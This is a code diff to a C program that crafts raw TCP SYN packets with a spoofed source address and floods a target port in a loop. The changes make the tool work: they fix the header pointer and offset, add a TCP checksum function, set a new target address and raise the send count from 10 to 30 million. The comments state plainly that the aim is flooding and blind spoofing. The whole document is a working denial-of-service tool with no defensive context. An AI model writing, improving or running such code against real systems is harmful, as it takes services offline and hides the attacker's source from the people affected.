@@ -35,18 +35,20 @@
 #define __FAVOR_BSD	/* use bsd'ish tcp header */
 #include <netinet/tcp.h>
 
+#include "tcp_checksum.h"
+
 #define PERROR(message)                                         \
         do {                                                    \
             printf(message);                                    \
             printf(" errno:%d(%s)\n", errno, strerror(errno));  \
         } while(0)
 
-#define P 80		/* lets flood the sendmail port */
+#define P 80 /* lets flood the sendmail port */
 
-#define SEND_COUNT 10
+#define SEND_COUNT 30000000
 
 unsigned short		/* this function generates header checksums */
-csum (unsigned short *buf, int nwords)
+ip_csum (unsigned short *buf, int nwords)
 {
 	unsigned long sum;
 	for (sum = 0; nwords > 0; nwords--)
@@ -54,6 +56,21 @@ csum (unsigned short *buf, int nwords)
 	sum = (sum >> 16) + (sum & 0xffff);
 	sum += (sum >> 16);
 	return ~sum;
+}
+unsigned short
+tcp_csum (unsigned long saddr, unsigned long daddr, unsigned short tcp_len, unsigned short* buf)
+{
+	unsigned short _saddr[2];
+	unsigned short _daddr[2];
+
+	_saddr[0] = (unsigned short) (saddr & 0xffff);
+	_saddr[1] = (unsigned short) (saddr >> 16);
+
+	_daddr[0] = (unsigned short) (daddr & 0xffff);
+	_daddr[1] = (unsigned short) (daddr >> 16);
+
+	printf("%x split into %x,%x\n", saddr, _saddr[0], _saddr[1]);
+	return tcp_sum_calc(tcp_len, _saddr, _daddr, (tcp_len%2), buf);
 }
 
 int 
@@ -66,7 +83,7 @@ main (void)
 				   at its beginning, and a tcp header structure after
 				   that to write the header values into it */
 	struct ip *iph = (struct ip *) datagram;
-	struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);
+	struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof (struct ip));
 	struct sockaddr_in sin;
 			/* the sockaddr_in containing the dest. address is used
 			 * in sendto() to determine the datagrams path */
@@ -74,7 +91,7 @@ main (void)
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons (P);/* you byte-order >1byte header values to network
 				  * byte order (not needed on big endian machines) */
-	sin.sin_addr.s_addr = inet_addr ("192.168.1.1");
+	sin.sin_addr.s_addr = inet_addr ("10.10.15.2");
 
 	memset (datagram, 0, 4096);	/* zero out the buffer */
 
@@ -87,7 +104,7 @@ main (void)
 	iph->ip_off = 0;
 	iph->ip_ttl = 255;
 	iph->ip_p = 6;
-	iph->ip_sum = 0;		/* set it to 0 before computing the actual checksum later */
+	iph->ip_sum = 0; /* set it to 0 before computing the actual checksum later */
 	iph->ip_src.s_addr = inet_addr ("1.2.3.4");/* SYN's can be blindly spoofed */
 	iph->ip_dst.s_addr = sin.sin_addr.s_addr;
 	tcph->th_sport = htons (1234);	/* arbitrary port */
@@ -95,14 +112,19 @@ main (void)
 	tcph->th_seq = random ();/* in a SYN packet, the sequence is a random */
 	tcph->th_ack = 0;/* number, and the ack sequence is 0 in the 1st packet */
 	tcph->th_x2 = 0;
-	tcph->th_off = 0;		/* first and only tcp segment */
-	tcph->th_flags = TH_SYN;	/* initial connection request */
-	tcph->th_win = htonl (65535);	/* maximum allowed window size */
+	tcph->th_off = sizeof(struct tcphdr)/4;	/* first and only tcp segment */
+	tcph->th_flags = TH_SYN;		/* initial connection request */
+	tcph->th_win = htonl (65535);		/* maximum allowed window size */
 	tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
-		      should fill in the correct checksum during transmission */
+			    should fill in the correct checksum during transmission */
 	tcph->th_urp = 0;
 
-	iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
+	iph->ip_sum = ip_csum((unsigned short *) datagram, iph->ip_len >> 1);
+
+	tcph->th_sum = tcp_csum(iph->ip_src.s_addr, 
+				iph->ip_dst.s_addr, 
+				sizeof(struct tcphdr), 
+				(unsigned short*)(datagram + sizeof(struct ip)));
 
 	s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);	/* open raw socket */
 	if (s < 0) {
@@ -124,12 +146,12 @@ main (void)
 	}
 
 	for (i=0; i<SEND_COUNT; i++) {
-		if(sendto(s,						/* our socket */
-			    datagram,					/* the buffer containing headers and data */
-			    iph->ip_len,				/* total length of our datagram */
-			    0,							/* routing flags, normally always 0 */
+		if(sendto(s,		/* our socket */
+			    datagram,	/* the buffer containing headers and data */
+			    iph->ip_len,/* total length of our datagram */
+			    0,		/* routing flags, normally always 0 */
 			    (struct sockaddr *) &sin,	/* socket addr, just like in */
-			    sizeof (sin)) < 0)			/* a normal send() */
+			    sizeof (sin)) < 0)		/* a normal send() */
 			PERROR("can not send message");
 		else
 			printf (".");
